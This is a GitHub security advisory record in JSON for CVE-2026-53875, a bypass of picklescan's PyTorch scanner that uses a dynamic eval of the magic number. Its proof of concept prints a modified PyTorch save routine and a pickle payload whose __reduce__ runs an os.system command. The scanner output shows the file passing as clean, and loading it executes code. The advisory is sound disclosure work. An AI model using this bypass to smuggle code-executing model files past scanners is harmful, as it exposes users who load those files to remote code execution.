{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/834641?v=4", "events_url": "https://api.github.com/users/zpbrent/events{/privacy}", "followers_url": "https://api.github.com/users/zpbrent/followers", "following_url": "https://api.github.com/users/zpbrent/following{/other_user}", "gists_url": "https://api.github.com/users/zpbrent/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/zpbrent", "id": 834641, "login": "zpbrent", "node_id": "MDQ6VXNlcjgzNDY0MQ==", "organizations_url": "https://api.github.com/users/zpbrent/orgs", "received_events_url": "https://api.github.com/users/zpbrent/received_events", "repos_url": "https://api.github.com/users/zpbrent/repos", "site_admin": false, "starred_url": "https://api.github.com/users/zpbrent/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/zpbrent/subscriptions", "type": "User", "url": "https://api.github.com/users/zpbrent", "user_view_type": "public"}}], "cve_id": "CVE-2026-53875", "cvss": {"score": null, "vector_string": null}, "cvss_severities": {"cvss_v3": {"score": 0.0, "vector_string": null}, "cvss_v4": {"score": 7.1, "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"}}, "cwes": [{"cwe_id": "CWE-184", "name": "Incomplete List of Disallowed Inputs"}], "description": "### Summary
This is a scanning bypass to `scan_pytorch` function in `picklescan`. As we can see in the implementation of [get_magic_number()](https://github.com/mmaitre314/picklescan/blob/2a8383cfeb4158567f9770d86597300c9e508d0f/src/picklescan/torch.py#L76C5-L84) that uses `pickletools.genops(data)` to get the `magic_number` with the condition `opcode.name` includes `INT` or `LONG`, but the PyTorch's implemtation simply uses [pickle_module.load()](https://github.com/pytorch/pytorch/blob/134179474539648ba7dee1317959529fbd0e7f89/torch/serialization.py#L1797) to get this `magic_number`. For this implementation difference, we then can embed the `magic_code` into the `PyTorch` file via dynamic `eval` on the `\_\_reduce\_\_` trick, which can make the `pickletools.genops(data)` cannot get the `magic_code` in `INT` or `LONG` type, but the `pickle_module.load()` can still return the same `magic_code`, eading to a bypass.

### PoC
#### Attack Step 1
we can edit the source code of the function [\_legacy\_save()](https://github.com/pytorch/pytorch/blob/134179474539648ba7dee1317959529fbd0e7f89/torch/serialization.py#L1120) as follows:
```Python
    class payload:
        def __reduce__(self):
            return (eval, ('MAGIC_NUMBER',))

    pickle_module.dump(payload(), f, protocol=pickle_protocol)
```
#### Attack Step 2
with the modified version of `PyTorch`, we run the following PoC to generate the `payload.pt`:
```Python
import torch 

class payload:
    def __reduce__(self):
        return (__import__('os').system, ('touch /tmp/hacked',))

torch.save(payload(), './payload.pt', _use_new_zipfile_serialization = False)
```

#### Picklescan result
```
ERROR: Invalid magic number for file /home/pzhou/bug-bunty/pytorch/PoC/payload.pt: None != 119547037146038801333356
----------- SCAN SUMMARY -----------
Scanned files: 0
Infected files: 0
Dangerous globals: 0
```

#### Victim Step
```Python
import torch
torch.load('./payload.pt', weights_only=False)
```
then you can find the illegal file `/tmp/hacked` created in your local system.

### Impact
Craft malicious `PyTorch` payloads to bypass `picklescan`, then recall ACE/RCE.", "epss": {"percentage": 0.00434, "percentile": 0.34559}, "ghsa_id": "GHSA-97f8-7cmv-76j2", "github_reviewed_at": "2026-02-18T17:45:52Z", "html_url": "https://github.com/advisories/GHSA-97f8-7cmv-76j2", "identifiers": [{"type": "GHSA", "value": "GHSA-97f8-7cmv-76j2"}, {"type": "CVE", "value": "CVE-2026-53875"}], "nvd_published_at": null, "published_at": "2026-02-18T17:45:52Z", "references": ["https://github.com/mmaitre314/picklescan/security/advisories/GHSA-97f8-7cmv-76j2", "https://github.com/mmaitre314/picklescan/commit/b9997634683a4f4bd0c7e3701e7ce7e90fe70e8c", "https://nvd.nist.gov/vuln/detail/CVE-2026-53875", "https://github.com/mmaitre314/picklescan/commit/134179474539648ba7dee1317959529fbd0e7f89", "https://github.com/mmaitre314/picklescan/commit/2a8383cfeb4158567f9770d86597300c9e508d0f", "https://www.vulncheck.com/advisories/picklescan-scanning-bypass-via-dynamic-eval-in-scan-pytorch", "https://github.com/advisories/GHSA-97f8-7cmv-76j2"], "repository_advisory_url": "https://api.github.com/repos/mmaitre314/picklescan/security-advisories/GHSA-97f8-7cmv-76j2", "severity": "high", "source_code_location": "https://github.com/mmaitre314/picklescan", "summary": "Picklescan (scan_pytorch) Bypass via dynamic eval MAGIC_NUMBER", "type": "reviewed", "updated_at": "2026-06-18T14:43:46Z", "url": "https://api.github.com/advisories/GHSA-97f8-7cmv-76j2", "vulnerabilities": [{"first_patched_version": "1.0.3", "package": {"ecosystem": "pip", "name": "picklescan"}, "vulnerable_functions": [], "vulnerable_version_range": "< 1.0.3"}], "withdrawn_at": null}

title: Picklescan (scan_pytorch) Bypass via dynamic eval MAGIC_NUMBER
